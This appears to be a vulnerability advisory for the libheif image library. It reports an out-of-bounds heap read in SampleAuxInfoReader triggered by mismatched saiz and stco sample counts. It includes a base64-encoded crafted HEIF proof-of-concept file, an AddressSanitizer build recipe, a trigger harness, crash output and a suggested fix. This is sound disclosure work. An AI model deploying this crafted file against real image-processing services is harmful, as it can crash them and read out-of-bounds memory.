# Heap OOB read in `SampleAuxInfoReader` constructor via `saiz`/`stco` sample count mismatch

**Affected versions:** libheif ≤ 1.21.2, master `f20a88baec0f34825cc076b3dfb2578fb2d5728c`  
**CWE:** CWE-125 (Out-of-bounds Read), CWE-617 (Reachable Assertion)  
**CVSS 3.1:** 6.5 Medium (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:H)  
**Trigger:** `heif_context_read_from_memory()` with a crafted HEIF file — crash during parsing, no extra API calls needed

---

## Root Cause

`SampleAuxInfoReader::SampleAuxInfoReader` (`track.cc:117–151`) iterates `nSamples` times (from the `saiz` box) while walking the `chunks` vector (sized by `stco`). When `saiz` declares more samples than `stco`/`stsc` cover, `current_chunk` is incremented past `chunks.size()`:

```cpp
// track.cc:138–143
for (uint32_t i = 0; i < nSamples; i++) {
    if (!oneChunk && i > chunks[current_chunk]->last_sample_number()) {
        current_chunk++;
        assert(current_chunk < chunks.size()); // line 141 — fires in debug/ASAN builds
        offset = saio->get_chunk_offset(current_chunk); // heap OOB READ in release builds
    }
}
```

The validation at `track.cc:437–440` only checks `saio.num_chunks == stco.num_chunks` — it does **not** verify that `saiz.num_samples ≤ total samples covered by stco/stsc`. A crafted file passes all guards and reaches the unsafe loop.


## Proof of Concept

### 1. Decode the POC file

Save the following as `decode_poc.py` and run `python3 decode_poc.py`:

```python
import base64, sys
data = "AAAAHGZ0eXBpc29tAAAAAGlzb21pc284aGVpYwAAApptb292AAAAbG12aGQAAAAAAAAAAAAAAAAAAAPoAAAAZAABAAABAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAACJnRyYWsAAABcdGtoZAAAAAMAAAAAAAAAAAAAAAEAAAAAAAAAZAAAAAAAAAAAAAAAAAEAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAABQAAAAPAAAAAAAcJtZGlhAAAAIG1kaGQAAAAAAAAAAAAAAAAAAAPoAAAAZAAAAAAAAAAtaGRscgAAAAAAAAAAdmlkZQAAAAAAAAAAAAAAAFZpZGVvSGFuZGxlcgAAAAFtbWluZgAAABR2bWhkAAAAAQAAAAAAAAAAAAAAJGRpbmYAAAAcZHJlZgAAAAAAAAABAAAADHVybCAAAAABAAABLXN0YmwAAABmc3RzZAAAAAAAAAABAAAAVmF2YzEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAABQADwAEgAAABIAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY//8AAAAYc3R0cwAAAAAAAAABAAAABAAAACEAAAAoc3RzYwAAAAAAAAACAAAAAQAAAAIAAAABAAAAAgAAAAIAAAABAAAAJHN0c3oAAAAAAAAAAAAAAAQAAAAKAAAACgAAAAoAAAAKAAAAGHN0Y28AAAAAAAAAAgAAAgAAAAMAAAAAI3NhaXoAAAABc3VpZAAAAAAAAAAACgQIBAgECAQIBAgAAAAgc2FpbwAAAAFzdWlkAAAAAAAAAAIAAAQAAAAFAA=="
open("poc_input", "wb").write(base64.b64decode(data))
print(f"Wrote {len(base64.b64decode(data))} bytes to poc_input")
```

The file is a valid ISOBMFF container where `saiz` declares **10 samples** but `stco`/`stsc` only cover **4 samples** across 2 chunks. When the `SampleAuxInfoReader` constructor processes sample index 4, `current_chunk` increments to 2, which equals `chunks.size()`.

### 2. Build libheif with AddressSanitizer

```bash
git clone --depth=1 https://github.com/strukturag/libheif.git /tmp/libheif
cmake -S /tmp/libheif -B /tmp/lhbuild \
    -DCMAKE_BUILD_TYPE=Debug \
    -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ \
    -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
    -DCMAKE_CXX_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
    -DCMAKE_INSTALL_PREFIX=/tmp/lhinstall \
    -DWITH_LIBDE265=OFF -DWITH_X265=OFF -DWITH_EXAMPLES=OFF
cmake --build /tmp/lhbuild -j$(nproc) --target install
```

### 3. Build and run the harness

Save as `poc_trigger.cc`:

```cpp
#include <cstdio>
#include <cstdlib>
#include <libheif/heif.h>

int main(int argc, char* argv[]) {
    const char* path = argc > 1 ? argv[1] : "poc_input";
    FILE* f = fopen(path, "rb");
    fseek(f, 0, SEEK_END); long sz = ftell(f); rewind(f);
    unsigned char* data = (unsigned char*)malloc(sz);
    fread(data, 1, sz, f); fclose(f);

    // Crash happens inside this call: Track::load -> SampleAuxInfoReader ctor
    heif_context* ctx = heif_context_alloc();
    heif_context_read_from_memory(ctx, data, sz, nullptr);

    fprintf(stderr, "UNEXPECTED: no crash\n");
    heif_context_free(ctx); free(data);
}
```

```bash
clang++ -fsanitize=address -fno-omit-frame-pointer -g -O1 \
    poc_trigger.cc \
    -I/tmp/lhinstall/include -L/tmp/lhinstall/lib -Wl,-rpath,/tmp/lhinstall/lib \
    -lheif -o poc_trigger

ASAN_OPTIONS="detect_leaks=0:print_stacktrace=1" ./poc_trigger poc_input
```

### 4. Expected output

```
track.cc:141: SampleAuxInfoReader::SampleAuxInfoReader(...):
    Assertion `current_chunk < chunks.size()' failed.

ERROR: AddressSanitizer: deadly signal
    #0  SampleAuxInfoReader::SampleAuxInfoReader(...)
            libheif/sequences/track.cc:141
    #1  Track::load(std::shared_ptr<Box_trak> const&)
            libheif/sequences/track.cc:447
    #2  HeifContext::interpret_heif_file_sequences()
            libheif/context.cc:1952
    #3  heif_context_read_from_memory
            libheif/api/libheif/heif_context.cc:67
```

> **Release builds** (without `assert`): the loop continues and `chunks[current_chunk]` becomes a **heap-buffer-overflow READ** on memory past the `m_chunks` vector.


## Suggested Fix

Add a cross-validation in `Track::load` before constructing `SampleAuxInfoReader` (around `track.cc:447`):

```cpp
if (saiz->get_num_samples() > m_stsz->num_samples()) {
    return Error{heif_error_Invalid_input, heif_suberror_Unspecified,
                 "'saiz' declares more samples than covered by 'stco'/'stsc'"};
}
```

Alternatively, replace the bare `assert` at `track.cc:141` with a proper bounds check that returns an error in both debug and release builds.
